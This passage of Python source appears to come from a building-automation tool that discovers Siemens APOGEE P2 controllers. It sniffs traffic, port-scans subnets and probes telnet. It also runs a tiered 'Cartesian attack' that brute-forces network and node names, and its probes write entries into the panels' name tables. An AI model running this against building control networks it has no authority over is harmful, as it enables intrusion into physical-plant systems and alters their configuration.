    Sends a Status Query and parses the response for the panel's identity.
    The panel echoes its own BLN in slot 0 and its node name in slot 3 of
    the role-swapped routing header, plus the supervisor identity it
    expects as an LP-string in the body after the SYST scope footer.

    Far cheaper than the Cartesian attack (§22.1) — one request gives us
    BLN + panel name + supervisor name. Strict-peer-list panels reject
    this the same way they reject IdentifyBlock; in that case the caller
    falls through to Cartesian.

    Args:
        host: Panel IP.
        scanner_name: Slot 4 source identifier. Use `<SITE>DCC-SVR|5033` when
            site is known; generic forms get silent-dropped on strict sites
            but work on permissive ones.
        bln_hint: Optional slot 0 value. Empty is safest for true cold
            discovery — the panel ignores empty routing slots on this opcode
            on permissive firmware.
        panel_hint: Optional slot 1 value (destination node name). Empty
            works on permissive sites; strict sites may require a guess.
        timeout: Per-attempt timeout in seconds.

    Returns:
        {'bln': str, 'panel': str, 'supervisor': str, 'msg_type': int} on
        success; None on no-response / RST / parse-fail.
    """
    bln_b = bln_hint.encode('ascii')
    panel_b = panel_hint.encode('ascii')
    scanner_b = scanner_name.encode('ascii')

    routing = (b'\x00'
               + bln_b + b'\x00'
               + panel_b + b'\x00'
               + bln_b + b'\x00'
               + scanner_b + b'\x00')

    # 0x0050 body per §22.6: opcode + 1-byte TLV "SYST" + SYST separator + wildcard.
    body = b'\x00\x50\x01\x00\x04SYST\x23\x3f\xff\xff\xff'
    payload = routing + body
    seq = secrets.randbits(24)

    for msg_type in (P2Message.TYPE_DATA, P2Message.TYPE_HEARTBEAT):
        frame = struct.pack('>III', 12 + len(payload), msg_type, seq) + payload
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, P2_PORT))
            sock.sendall(frame)
            data = _recv_one_frame(sock, overall_timeout=timeout)
        except (socket.error, socket.timeout):
            data = None
        finally:
            if sock is not None:
                try: sock.close()
                except Exception: pass

        if data is None or len(data) < 14:
            continue
        # Reject error-direction responses; spec §8.3.
        if data[12] == P2Message.DIR_ERROR:
            continue

        rh = _parse_routing_header(data[12:])
        if rh is None:
            continue
        _dir, names, body_after = rh
        if len(names) < 4:
            continue
        bln_resp = names[0]
        us_resp = names[1]
        panel_resp = names[3]

        # Sanity: panel must have filled in something useful. An echo of
        # our empty slots without any identity content is not a usable
        # response.
        if not bln_resp or not panel_resp:
            continue

        # Supervisor identity comes back as an LP-string in the body, after
        # the echoed scope footer. _extract_tlv_strings will find both
        # "SYST" (from the echoed scope) and the supervisor name; filter
        # "SYST" out and take the first remaining string. If parsing fails
        # we fall back to slot-1 ("us" position after role swap), which is
        # what the panel thinks our identity should be.
        sup_strings = _extract_tlv_strings(body_after)
        supervisor = next((s for s in sup_strings if s != "SYST"), us_resp)

        return {
            'bln': bln_resp,
            'panel': panel_resp,
            'supervisor': supervisor,
            'msg_type': msg_type,
        }

    return None


def _cold_cartesian_attack(host: str, bln_list: List[str],
                           scanner_list: List[str], node_list: List[str],
                           delay: float = 0.3, inter_tier_pause: float = 5.0,
                           force_full: bool = False
                           ) -> Optional[Tuple[str, str, str, bytes]]:
    tiers = [
        ("Tier 1 (high-probability)", 2, 3, 3),
        ("Tier 2 (plausible)",        4, 4, 5),
    ]
    if force_full:
        tiers.append(("Tier 3 (exhaustive)",
                      len(scanner_list), len(bln_list), len(node_list)))

    attempted: set = set()
    attempt_num = 0

    for idx, (label, s_n, b_n, n_n) in enumerate(tiers):
        scanners = scanner_list[:s_n]
        blns = bln_list[:b_n]
        nodes = node_list[:n_n]
        new_combos = [(sc, bl, nd)
                      for sc in scanners for bl in blns for nd in nodes
                      if (sc, bl, nd) not in attempted]
        for combo in new_combos:
            attempted.add(combo)
        if not new_combos:
            continue

        print(f"\n  {label}: {len(new_combos)} combo(s)")
        if idx > 0:
            print(f"  Pausing {inter_tier_pause}s (lockout safety)...")
            time.sleep(inter_tier_pause)

        for sc, bl, nd in new_combos:
            attempt_num += 1
            print(f"  [{attempt_num:3d}] scanner={sc!r:<25} BLN={bl!r:<12} "
                  f"node={nd!r:<8}", end=" ", flush=True)
            result = _cold_probe(host, bl, sc, nd)
            v = result['verdict']
            if v == 'got_response':
                print(f"ACCEPTED ({len(result['data'])} bytes)")
                return (sc, bl, nd, result['data'])
            elif v == 'rejected_rst':
                print(f"RST (wrong BLN)")
            elif v == 'rejected_silent':
                print(f"silent (wrong scanner/node)")
            elif v == 'port_closed':
                print(f"port closed — aborting")
                return None
            else:
                print(f"{v}")
            time.sleep(delay)
    return None


def _cold_parse_node_name(data: bytes, our_scanner: str,
                          our_bln: str) -> Optional[str]:
    if len(data) < 14 or data[12] != 0x01:
        return None
    payload = data[13:]
    strings, cur = [], bytearray()
    for b in payload:
        if b == 0:
            if cur:
                try:
                    sv = cur.decode('ascii')
                    if sv.isprintable():
                        strings.append(sv)
                except UnicodeDecodeError:
                    pass
                cur = bytearray()
            if len(strings) >= 4:
                break
        else:
            cur.append(b)
    excluded = {our_scanner, our_bln}
    for sv in strings:
        if sv not in excluded and (sv.upper().startswith('NODE')
                                   or sv.upper().startswith('PXC')):
            return sv
    return strings[3] if len(strings) >= 4 else None


def cold_discover_site(ranges: Optional[List[str]] = None,
                       pxc_ips: Optional[List[str]] = None,
                       site_hint: Optional[str] = None,
                       bacnet_duration: int = 30,
                       bacnet_interface: str = '0.0.0.0',
                       skip_bacnet: bool = False,
                       force_full: bool = False,
                       delay: float = 0.3,
                       verbose: bool = False) -> Optional[Dict]:
    """Discover BLN name, scanner name, and at least one node name on a site
    where nothing is preconfigured. Returns a dict suitable for site.json,
    or None on failure."""
    print(f"\n{'═' * 70}")
    print(f"  COLD-SITE DISCOVERY")
    print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'═' * 70}")

    discoveries: Dict[str, dict] = {}
    inferred_prefixes: List[str] = []
    siemens_ips_from_bacnet: List[str] = []

    # Phase 1: BACnet recon
    if not skip_bacnet and not pxc_ips:
        discoveries = _cold_passive_bacnet(
            duration=bacnet_duration, interface=bacnet_interface,
            verbose=verbose)
        if discoveries:
            print(f"\n  BACnet devices:")
            for ip in sorted(discoveries, key=lambda s: tuple(int(o) for o in s.split('.'))):
                mac = _cold_get_arp_mac(ip)
                vendor = _cold_classify_vendor(mac)
                is_siemens = mac and mac[:8].lower() in _COLD_SIEMENS_OUIS
                marker = " ← SIEMENS" if is_siemens else ""
                print(f"    {ip:<16} {mac or '(unknown)':<20} "
                      f"{vendor:<32} pkts={discoveries[ip]['packet_count']}{marker}")
                if is_siemens:
                    siemens_ips_from_bacnet.append(ip)
        inferred_prefixes = _cold_infer_prefix(discoveries)
        if inferred_prefixes:
            print(f"\n  Inferred site prefix(es): {', '.join(inferred_prefixes)}")

    if site_hint:
        prefixes = [site_hint]
        print(f"\n  Using user-provided site hint: {site_hint}")
    elif inferred_prefixes:
        prefixes = inferred_prefixes
    else:
        prefixes = []
        print(f"\n  No site prefix — falling back to universal candidates")

    # Phase 2: PXC discovery and fingerprint
    if pxc_ips:
        candidate_ips = list(pxc_ips)
        print(f"\n  Using {len(candidate_ips)} provided PXC IP(s)")
    else:
        from ipaddress import ip_network
        scan_ips: set = set()
        for r in (ranges or []):
            try:
                net = ip_network(r, strict=False)
                hosts = net.hosts() if net.prefixlen <= 30 else net
                scan_ips.update(str(ip) for ip in hosts)
            except ValueError:
                scan_ips.add(r)
        scan_ips.update(siemens_ips_from_bacnet)
        if not scan_ips:
            print(f"\n  No scan targets. Provide --range or --pxc.")
            return None
        print(f"\n  PHASE 2: Port scan {len(scan_ips)} IPs for TCP/{P2_PORT}")
        candidate_ips = port_scan_p2(sorted(scan_ips,
                                     key=lambda s: tuple(int(o) for o in s.split('.'))))

    if not candidate_ips:
        print(f"  No hosts with TCP/{P2_PORT} open.")
        return None

    print(f"\n  PHASE 2b: Fingerprint {len(candidate_ips)} host(s)")
    siemens_pxcs = []
    for host in candidate_ips:
        r = _cold_probe(host, "DIAGTEST", "DIAGPROBE|5033", "node1")
        if r['verdict'] == 'rejected_rst':
            print(f"    {host:<16} SIEMENS PXC (rejected wrong BLN)")
            siemens_pxcs.append(host)
        elif r['verdict'] == 'rejected_silent':
            print(f"    {host:<16} Siemens-maybe (silent drop)")
            siemens_pxcs.append(host)
        elif r['verdict'] == 'got_response':
            print(f"    {host:<16} RESPONDED to junk — not-Siemens")
        else:
            print(f"    {host:<16} {r['verdict']}")

    if not siemens_pxcs:
        print(f"\n  No Siemens PXCs identified.")
        return None

    # Phase 2c: 0x0050 StatusQuery bootstrap (APOGEE_P2_SPEC.md §22.6).
    # One round-trip per panel returns BLN + node name + supervisor identity
    # — far cheaper than the Cartesian attack in Phase 3. Strict-peer-list
    # panels reject this the same way they reject IdentifyBlock; we fall
    # through to Phase 3 if every host silent-drops.
    print(f"\n  PHASE 2c: 0x0050 status-query bootstrap (§22.6)")
    bootstrap_scanner = (f"{prefixes[0].upper()}DCC-SVR|5033" if prefixes
                         else "P2SCAN-LAP|5033")
    bootstrap_hits: Dict[str, Dict[str, Any]] = {}
    for host in siemens_pxcs:
        print(f"    {host:<16} scanner={bootstrap_scanner!r}", end=" ", flush=True)
        result = _cold_status_query_probe(host, bootstrap_scanner)
        if result:
            print(f"BLN={result['bln']!r} node={result['panel']!r}")
            bootstrap_hits[host] = result
        else:
            print("(no response)")
        time.sleep(delay)

    if bootstrap_hits:
        # Short-circuit Phase 3 — we have everything we need.
        first_ip = next(iter(bootstrap_hits))
        first = bootstrap_hits[first_ip]
        bln = first['bln']
        scanner = first['supervisor']
        print(f"\n{'═' * 70}")
        print(f"  COLD DISCOVERY COMPLETE (via 0x0050 bootstrap)")
        print(f"{'═' * 70}")
        print(f"  BLN name:     {bln}")
        print(f"  Scanner name: {scanner}")
        print(f"  Hosts with bootstrap hits: {len(bootstrap_hits)}/{len(siemens_pxcs)}")

        site_name = prefixes[0].upper() if prefixes else "SITE"
        site_config = {
            "p2_network": bln,
            "p2_site": site_name,
            "scanner_name": scanner,
            "known_nodes": {},
        }
        for ip in siemens_pxcs:
            if ip in bootstrap_hits:
                site_config["known_nodes"][bootstrap_hits[ip]['panel']] = ip
            else:
                site_config["known_nodes"][f"UNKNOWN_{ip.split('.')[-1]}"] = ip

        print(f"\n  site.json content:")
        for line in json.dumps(site_config, indent=2).splitlines():
            print(f"  {line}")
        return site_config

    # Phase 3: Cartesian attack (fallback when bootstrap got zero hits)
    bln_candidates = _cold_generate_bln_candidates(prefixes)
    scanner_candidates = _cold_generate_scanner_candidates(prefixes)
    node_candidates = _cold_generate_node_candidates()
    target = siemens_pxcs[0]
    print(f"\n  PHASE 3: Cartesian attack against {target}")
    hit = _cold_cartesian_attack(target, bln_candidates, scanner_candidates,
                                  node_candidates, delay=delay,
                                  force_full=force_full)

    if not hit:
        print(f"\n{'═' * 70}")
        print(f"  INCOMPLETE — no working combo found")
        print(f"{'═' * 70}")
        print(f"  Siemens PXCs: {', '.join(siemens_pxcs)}")
        if not force_full:
            print(f"  Retry with --force-full for exhaustive sweep.")
        return None

    scanner, bln, node_guess, data = hit
    extracted = _cold_parse_node_name(data, scanner, bln)
    node = extracted or node_guess

    print(f"\n{'═' * 70}")
    print(f"  COLD DISCOVERY COMPLETE")
    print(f"{'═' * 70}")
    print(f"  BLN name:     {bln}")
    print(f"  Scanner name: {scanner}")
    print(f"  Node (for {target}): {node}")
    print(f"  All Siemens PXCs: {', '.join(siemens_pxcs)}")

    site_name = prefixes[0].upper() if prefixes else "SITE"
    site_config = {
        "p2_network": bln,
        "p2_site": site_name,
        "scanner_name": scanner,
        "known_nodes": {},
    }
    for ip in siemens_pxcs:
        label = node if ip == target else f"UNKNOWN_{ip.split('.')[-1]}"
        site_config["known_nodes"][label] = ip

    print(f"\n  site.json content:")
    for line in json.dumps(site_config, indent=2).splitlines():
        print(f"  {line}")
    return site_config


# ─────────────────────────────────────────────────────────────────────────────
# Polished one-shot cold discovery (added 2026-05-20)
#
# Higher-level wrapper around cold_discover_site() that adds:
#   * Automatic local-subnet detection — no --range required
#   * Per-panel name backfill via 0x0050 follow-up against any host that the
#     first-pass bootstrap left labeled UNKNOWN_<last-octet>
#   * Atomic site.json write that preserves arbitrary extra keys (e.g.
#     known_builds, _comment) the caller may have already written
#
# Entry point for users: run with no arguments — `polished_cold_discover()`.
# This is also what the GUI's "Cold Discover (Auto)" menu item drives.
# ─────────────────────────────────────────────────────────────────────────────

# Common telnet service port. Insight/Desigo CC's "Field Network" view
# surfaces the same telnet-availability indicator per panel — knowing
# which PXCs have telnet open is the difference between "I can SSH/telnet
# in and run `nodeNametable Remove` cleanup" vs "I have to drive to the
# physical panel for service-port access."
TELNET_PORT = 23


def probe_telnet_status(host: str, timeout: float = 1.0,
                        read_banner: bool = True
                        ) -> Dict[str, Any]:
    """Probe TCP/23 reachability on `host`. Pure-stdlib, read-only.

    A successful TCP connect on port 23 means the panel's telnet service
    is accepting connections — the panel can be reached for operator
    cleanup tooling like `Fieldpanels dElete <name>` and
    `nodeNametable Remove <name>`. A refused / timed-out connect means
    telnet is disabled (operator policy), blocked by an upstream ACL,
    or the panel is unreachable at the IP layer.

    Args:
        host: Panel IPv4 address.
        timeout: Per-attempt connect timeout in seconds.
        read_banner: If True, attempt to read a short banner (up to
            128 bytes / 1 s) for diagnostic display. Most PXC telnet
            stacks send a banner immediately; some don't until input
            arrives.

    Returns:
        {
            'host':           '<ip>',
            'open':           True / False,
            'banner':         '<first-line>' or None,
            'error':          str  (only set on connect failure)
        }
    """
    out: Dict[str, Any] = {'host': host, 'open': False,
                           'banner': None, 'error': None}
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        # Use connect() (raising form) instead of connect_ex() — the
        # latter returns WSAEWOULDBLOCK (10035) on Windows when the
        # timeout elapses with the syscall still pending, which is
        # indistinguishable from a real WOULDBLOCK in non-blocking mode
        # and bites every cross-platform probe written this way. The
        # raising form gives us socket.timeout for "no answer in time"
        # and ConnectionRefusedError for "panel said no", which is what
        # we want to distinguish.
        sock.connect((host, TELNET_PORT))
        out['open'] = True
        if read_banner:
            try:
                sock.settimeout(1.0)
                data = sock.recv(128)
                if data:
                    # First printable line, stripped. Telnet IAC bytes
                    # (0xFF…) appear early in some banners — keep only
                    # printable ASCII so the GUI doesn't try to render
                    # control sequences.
                    line = data.split(b'\n', 1)[0]
                    text = ''.join(chr(b) for b in line
                                   if 32 <= b < 127).strip()
                    if text:
                        out['banner'] = text
            except (socket.timeout, OSError):
                pass  # banner is optional diagnostic
        return out
    except socket.timeout:
        out['error'] = 'timeout'
        return out
    except ConnectionRefusedError:
        out['error'] = 'connection refused'
        return out
    except OSError as e:
        # Unreachable host, no route, DNS failure, etc.
        out['error'] = f"{type(e).__name__}: {e}"
        return out
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def probe_telnet_status_bulk(hosts: List[str], timeout: float = 1.0,
                             verbose: bool = False
                             ) -> Dict[str, Dict[str, Any]]:
    """Run `probe_telnet_status` against many hosts sequentially.

    Returns: {host: probe_result_dict}. Sequential (not parallel) on
    purpose — same rationale as the cold-discovery delays, plus most
    fleets are <50 panels and a 1-s-per-host probe finishes in under
    a minute. If you need parallel, wrap this with a ThreadPoolExecutor.
    """
    results: Dict[str, Dict[str, Any]] = {}
    for i, host in enumerate(hosts, start=1):
        if verbose:
            print(f"    [{i}/{len(hosts)}] {host:<16} telnet probe...",
                  end=" ", flush=True)
        r = probe_telnet_status(host, timeout=timeout)
        results[host] = r
        if verbose:
            if r['open']:
                banner = f" banner={r['banner']!r}" if r['banner'] else ""
                print(f"OPEN{banner}")
            else:
                print(f"closed ({r['error']})")
    return results


def get_primary_local_ipv4() -> Optional[str]:
    """Return the IPv4 of the interface used to reach the default gateway.

    Pure stdlib. The connect-to-UDP trick doesn't actually send a packet —
    it just causes the kernel to populate the local source address as if
    it were going to. Works on Windows / Linux / macOS without admin or
    external deps. Returns None on failure.
    """
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # 8.8.8.8 is the canonical "any reachable internet host" placeholder.
        # Anything routable works; nothing is actually transmitted.
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except OSError:
        return None
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def auto_detect_local_subnets(assume_prefix: int = 24) -> List[str]:
    """Detect local IPv4 subnet(s) the machine is connected to (CIDR list).

    Pure stdlib. Returns a list of CIDR strings, primary interface first.
    Loopback and link-local are excluded. `assume_prefix` is the netmask
    bits to apply (default /24 — overwhelmingly the most common LAN size
    for BAS subnets). Multihomed machines (e.g. a separate NIC into a BAS
    VLAN) may surface additional candidates via socket.getaddrinfo on the
    hostname, though that path is OS-dependent and not all platforms list
    every interface.

    Example return values:
        ['192.168.1.0/24']
        ['192.0.2.0/24', '192.168.1.0/24']
        []   # neither path worked — caller should prompt for a range
    """
    from ipaddress import IPv4Address, IPv4Network

    found: List[str] = []
    seen_networks: set = set()

    # Primary: gateway-route trick. Most reliable single answer.
    primary = get_primary_local_ipv4()
    if primary:
        try:
            net = IPv4Network(f"{primary}/{assume_prefix}", strict=False)
            if not net.is_loopback and not net.is_link_local:
                cidr = str(net)
                if cidr not in seen_networks:
                    found.append(cidr)
                    seen_networks.add(cidr)
        except ValueError:
            pass

    # Secondary: enumerate any other IPv4 the OS reports for the hostname.
    # Catches some multihomed setups (a BAS VLAN bound to a second NIC)
    # but is OS-dependent — Windows may surface every adapter, Linux
    # often only surfaces /etc/hosts entries.
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ip_str = info[4][0]
            try:
                ip = IPv4Address(ip_str)
                if ip.is_loopback or ip.is_link_local:
                    continue
                net = IPv4Network(f"{ip_str}/{assume_prefix}", strict=False)
                cidr = str(net)
                if cidr not in seen_networks:
                    found.append(cidr)
                    seen_networks.add(cidr)
            except ValueError:
                continue
    except (socket.gaierror, OSError):
        pass

    return found


def _atomic_write_site_json(path: str, site_config: Dict) -> bool:
    """Write `site_config` (canonical site.json keys) to `path` atomically,
    preserving any extra keys (e.g. known_builds, _comment) that already
    exist in the file. Returns True on success, False on OSError.

    Atomic semantics: writes to `path + '.tmp'` then os.replace's it in,
    so a crash mid-write doesn't corrupt the existing file.
    """
    try:
        existing: Dict = {}
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    existing = json.load(f)
                if not isinstance(existing, dict):
                    existing = {}
            except (json.JSONDecodeError, OSError):
                existing = {}
        # Overlay the discovery-side keys; everything else is preserved.
        # node_telnet is the per-node telnet-port-open map produced by
        # the polished cold-discovery flow (Phase 5). Backward compat:
        # absence is treated as "unknown" by the GUI, not "closed."
        for key in ('p2_network', 'p2_site', 'scanner_name',
                    'known_nodes', 'node_telnet'):
            if key in site_config:
                existing[key] = site_config[key]
        tmp_path = path + '.tmp'
        with open(tmp_path, 'w', encoding='utf-8') as f:
            json.dump(existing, f, indent=2)
            f.write('\n')
        os.replace(tmp_path, path)
        return True
    except OSError:
        return False


def passive_sniff_bln(duration: int = 10,
                      interface: Optional[str] = None,
                      verbose: bool = True) -> Optional[str]:
    """Passively sniff TCP/5033 for `duration` seconds and extract the BLN
    name from the first valid P2 frame seen.

    Pure-passive: no packets sent, no NODE NAME TABLE writes, no impact on
    the BAS network. Works because the Desigo CC supervisor pushes to each
    PXC constantly (heartbeats, COVs, replication) and every routing header
    on TCP/5033 carries the BLN in slot 1.

    Requires `tshark` (Wireshark CLI) to be installed and on PATH or in one
    of the standard Windows install locations.

    Does NOT depend on or modify the module-level P2_NETWORK global — this
    is a fresh capture+parse that returns ONLY what was actually seen in
    the window. (The older `sniff_network_name` has a side-effect bug where
    it returns the pre-existing P2_NETWORK without actually sniffing if the
    global was previously set by a config load. This function avoids that.)

    Returns the BLN string on success, None on:
      - tshark not installed
      - no TCP/5033 traffic in the capture window
      - parse failure
      - PermissionError (need admin / wireshark group on Linux)
    """
    import subprocess
    import shutil
    import tempfile

    # Find tshark
    tshark = shutil.which('tshark')
    if not tshark:
        for path in [r'C:\Program Files\Wireshark\tshark.exe',
                     r'C:\Program Files (x86)\Wireshark\tshark.exe']:
            if os.path.exists(path):
                tshark = path
                break
    if not tshark:
        if verbose:
            print(f"  tshark not found — cannot passive-sniff BLN.")
        return None

    if verbose:
        print(f"  Passive BLN sniff: tshark capturing TCP/5033 for "
              f"{duration} s (no probes sent)...")

    # NamedTemporaryFile(delete=False) creates the file atomically and avoids
    # the TOCTOU race in the deprecated tempfile.mktemp(). Cleanup in finally.
    with tempfile.NamedTemporaryFile(delete=False, suffix='.pcapng') as _tf:
        tmpfile = _tf.name
    try:
        cmd = [tshark, '-a', f'duration:{duration}',
               '-f', 'tcp port 5033', '-w', tmpfile, '-q']
        if interface:
            cmd.extend(['-i', interface])
        try:
            subprocess.run(cmd, capture_output=True, text=True,
                           timeout=duration + 10)
        except subprocess.TimeoutExpired:
            if verbose:
                print(f"  Sniff timed out.")
            return None
        except (FileNotFoundError, PermissionError) as e:
            if verbose:
                print(f"  Sniff failed: {e}")
            return None

        if not os.path.exists(tmpfile) or os.path.getsize(tmpfile) < 100:
            if verbose:
                print(f"  No TCP/5033 traffic captured in {duration} s "
                      f"window (supervisor may be quiet, or interface may "
                      f"not see BAS traffic).")
            return None

        # Parse the pcapng — find the first valid P2 frame and extract
        # slot 1. The P2 header signature is bytes 4-7 = 0x00000033 (DATA)
        # or 0x00000034 (HEARTBEAT). We scan for these byte patterns, then
        # validate the surrounding frame structure before trusting the
        # slot extraction.
        with open(tmpfile, 'rb') as f:
            raw = f.read()
        bln = _parse_first_bln_from_capture(raw)
        if bln:
            if verbose:
                print(f"  BLN learned from wire: {bln!r}")
            return bln
        if verbose:
            print(f"  TCP/5033 traffic captured but no parseable P2 frame "
                  f"found.")
        return None
    finally:
        try:
            os.unlink(tmpfile)
        except OSError:
            pass


def _parse_first_bln_from_capture(raw: bytes) -> Optional[str]:
    """Scan raw pcapng bytes for the first valid P2 frame and return slot 1
    (the BLN name). Returns None if no valid frame is found.

    Validation rules (must all pass):
      * msg_type field (bytes 4-7 of candidate frame) is 0x00000033 (DATA)
        or 0x00000034 (HEARTBEAT)
      * total_len field (bytes 0-3) is in [20, 16384]
      * direction byte (byte 12) is 0x00 (request) or 0x01 (response)
      * slot 1 ends with a null within 32 bytes of frame start + 13
      * slot 1 is 3-32 printable ASCII characters with no pipe `|`
        (pipe is the supervisor-port separator like `<SITE>DCC-SVR|5033`,
        which never appears in the BLN field)
    """
    for sig in (b'\x00\x00\x00\x33', b'\x00\x00\x00\x34'):
        i = 0
        while True:
            i = raw.find(sig, i)
            if i < 0:
                break
            # Candidate P2 frame starts 4 bytes before the msg_type match
            if i < 4:
                i += 1
                continue
            frame_start = i - 4
            if frame_start + 13 > len(raw):
                break
            total_len = int.from_bytes(
                raw[frame_start:frame_start + 4], 'big')
            if not (20 <= total_len <= 16384):
                i += 1
                continue
            dir_byte = raw[frame_start + 12]
            if dir_byte not in (0x00, 0x01):
                i += 1
                continue
            # Slot 1 starts at offset 13 and is null-terminated
            end = raw.find(
                b'\x00',
                frame_start + 13,
                min(frame_start + 13 + 32, len(raw))
            )
            if end < 0 or end == frame_start + 13:
                i += 1
                continue
            slot1 = raw[frame_start + 13:end]
            if not (3 <= len(slot1) <= 32):
                i += 1
                continue
            try:
                bln = slot1.decode('ascii')
            except UnicodeDecodeError:
                i += 1
                continue
            if not bln.isprintable() or '|' in bln:
                i += 1
                continue
            return bln
    return None


def _discover_bln_via_probe(host: str,
                            bln_candidates: List[str],
                            node_candidate: str = 'node1',
                            delay: float = 0.3,
                            stop_event: Optional[Any] = None,
                            verbose: bool = True) -> Optional[str]:
    """Active BLN discovery against a single PXC. Iterates BLN candidates
    using the 15-character placeholder in slot 4 + a single node-name
    candidate in slot 2.

    Per-candidate behavior:
      * Wrong BLN → panel TCP-RSTs (verdict='rejected_rst'). NO write to
        NODE NAME TABLE — the RST happens before any application-layer
        processing.
      * Right BLN + wrong node → silent drop (verdict='rejected_silent').
        ONE write to NODE NAME TABLE on this panel under the placeholder
        name. We've still learned the BLN.
      * Right BLN + right node → response (verdict='got_response'). One
        write. We've learned both BLN and a valid node name.

    Worst-case NODE NAME TABLE footprint: 1 entry on this single panel
    under WILDCARD_15CHAR_PLACEHOLDER. Propagates BLN-wide via replication ⇒
    1 BLN-wide entry total. Cleanup is a single `nodeNametable Remove
    RANDOM15CHARSXY` afterward.

    Returns the first BLN that produced a non-RST response, or None if
    every candidate TCP-RST'd. Honors stop_event between candidates.
    """
    for bln in bln_candidates:
        if stop_event is not None and stop_event.is_set():
            if verbose:
                print(f"      Cancelled during BLN discovery.")
            return None
        if verbose:
            print(f"      BLN guess: {bln!r:<14}", end=" ", flush=True)
        r = _cold_probe(host, bln, WILDCARD_15CHAR_PLACEHOLDER, node_candidate,
                        timeout=2.0)
        v = r['verdict']
        if v in ('got_response', 'rejected_silent'):
            if verbose:
                print(f"HIT (verdict={v}) — BLN learned: {bln!r}")
            return bln
        if v == 'port_closed':
            if verbose:
                print(f"port closed (cannot continue against this host)")
            return None
        if verbose:
            print(f"miss ({v})")
        time.sleep(delay)
    return None


def _default_bln_candidate_list(site_hint: Optional[str] = None) -> List[str]:
    """Build a BLN candidate list. If `site_hint` is provided (e.g. 'ACME'),
    generates targeted candidates from the existing pattern list. Always
    falls back to generic common-pattern candidates so the list is useful
    even with no hint.
    """
    candidates: List[str] = []
    if site_hint:
        candidates.extend(_cold_generate_bln_candidates([site_hint]))
    else:
        # No hint — provide common patterns most BAS sites land on.
        # APOGEEBLN, SIEMENS, MAIN are vendor-default-ish; BLN1, BLN, NET,
        # P2NET cover short common names.
        candidates.extend(["APOGEEBLN", "APOGEE", "SIEMENS", "MAIN",
                           "MAINBLN", "BLN1", "BLN", "DEFAULTBLN",
                           "DEFAULT", "NETWORK", "P2NET", "NET"])
    # Dedup preserving order
    seen, out = set(), []
    for c in candidates:
        if c and c not in seen:
            seen.add(c)
            out.append(c)
    return out


def auto_detect_site_prefixes(duration: int = 15,
                              interface: str = '0.0.0.0',
                              verbose: bool = True) -> List[str]:
    """Passive BACnet/IP recon — listen UDP/47808 for `duration` seconds,
    capture I-Am / Who-Is and unsolicited COV broadcasts, extract device-
    name strings, infer the dominant site prefix(es) from naming patterns.

    Pure-passive: binds to UDP/47808 read-only, sends nothing, makes no
    NODE NAME TABLE writes anywhere. Works on switched networks because
    BACnet/IP broadcasts are visible to every host on the subnet (unlike
    unicast TCP traffic which the laptop can't see without a SPAN port).

    Why this works for BLN discovery: in a typical Siemens BAS deployment
    the Desigo CC supervisor speaks BACnet/IP heavily, and its device-
    object name typically encodes the site prefix (e.g. 'ACMEBAS-Server',
    'MAINBacnetGW', etc.). Third-party BACnet controllers on the same
    network often use the same prefix as their object names. The
    `_cold_infer_prefix` heuristic identifies the dominant prefix across
    all observed device names and returns it (e.g. 'ACME').

    Returns a list of inferred prefixes ordered by confidence (most-likely
    first). Empty list if no BACnet traffic or no parseable prefix
    discovered. Caller can feed the result to `_default_bln_candidate_list`
    or pass each prefix as `site_hint` to `cold_discover_minimal`.

    Args:
        duration: seconds to listen (default 15 — usually enough for a
            handful of I-Am broadcasts + unsolicited COVs on an active
            BAS network).
        interface: bind address (default 0.0.0.0 = all interfaces).
        verbose: print progress to stdout.

    Returns:
        e.g. ['ACME']  or  ['MAIN', 'BAS']  or  []
    """
    discoveries = _cold_passive_bacnet(
        duration=duration, interface=interface, verbose=verbose)
    if not discoveries:
        if verbose:
            print(f"  No BACnet/IP devices observed in {duration} s.")
        return []
    prefixes = _cold_infer_prefix(discoveries)
    if verbose:
        if prefixes:
            print(f"  Inferred site prefix(es): {prefixes}")
        else:
            print(f"  Captured {len(discoveries)} BACnet device(s) but "
                  f"could not infer a dominant site prefix from device "
                  f"names.")
    return prefixes


def cold_discover_minimal(network: str,
                          bln: Optional[str] = None,
                          node_candidates: Optional[List[str]] = None,
                          site_hint: Optional[str] = None,
                          probe_delay: float = 0.5,
                          port_scan_timeout: float = 0.5,
                          stop_event: Optional[Any] = None,
                          verbose: bool = True) -> Optional[Dict]:
    """Cold discovery via the 2-packet primitive: IdentifyBlock handshake
    (Packet A) + 0x0050 StatusQuery chain (Packet B).

    Requires the BLN as input — the handshake's bouncer TCP-RSTs any
    wrong-BLN frame so we cannot discover the BLN by probing. Supply
    `bln` from prior site.json, from Desigo CC's Field Networks view,
    or from a passive sniff of supervisor-port (TCP/5033) traffic.

    Per-panel NODE NAME TABLE footprint:
      ONE entry under WILDCARD_15CHAR_PLACEHOLDER (= "RANDOM15CHARSXY") mapped
      to this machine's IP. Even though the function tries multiple
      `node_candidates` per panel and most are silent-dropped, every
      probe uses the SAME slot-4 placeholder, so the silent-drop writes
      are idempotent. Across all panels: ONE BLN-wide entry under
      RANDOM15CHARSXY (BLN replication collapses identical name+IP
      writes).

      Cleanup: telnet into any one panel and run
          nodeNametable Remove RANDOM15CHARSXY
      The removal propagates BLN-wide within ~2 minutes.

    Returns the standard site_config dict on success, None on failure.

    Args:
        network: CIDR to scan (e.g. '192.168.1.0/24').
        bln: REQUIRED. The BLN (Building Local Network) name. Wrong
            BLN → TCP RST from every panel, function returns None.
        node_candidates: Optional list of lowercase node-name candidates
            to try in slot 2. Defaults to ['node1', 'node2', ...,
            'node20'] which covers most field-panel naming conventions.
            For sites with unusual naming, provide an explicit list.
        probe_delay: Inter-probe delay (seconds). Default 0.5.
        port_scan_timeout: Per-host TCP/5033 connect timeout.
        verbose: Print progress to stdout.

    What this function does NOT do (intentionally):
      * BACnet recon
      * Siemens fingerprint probe (wrong-BLN write attempt — TCP RSTs
